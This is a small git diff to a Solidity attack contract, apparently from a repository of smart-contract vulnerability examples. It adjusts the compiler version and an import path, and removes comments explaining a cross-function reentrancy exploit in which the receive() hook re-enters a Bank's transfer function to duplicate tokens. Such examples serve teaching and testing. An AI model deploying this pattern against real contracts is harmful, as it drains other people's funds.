@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity 0.8.25;
+pragma solidity ^0.8.0;
 
-import "./crossFunctionReentrancy.sol";
+import "./CrossFunctionReentrancy.sol";
 
 contract crossFunctionReentrancyAttack {
     Bank bank;
@@ -25,8 +25,6 @@ contract crossFunctionReentrancyAttack {
 
     receive() external payable {
         uint256 balance = bank.balanceOf(address(this));
-        //If an attacker re-enters the transfer function, they can exploit
-        //the situation by duplicating tokens for profit.
         try bank.transfer(arbitrageAccount, balance) {} catch {}
     }
 }
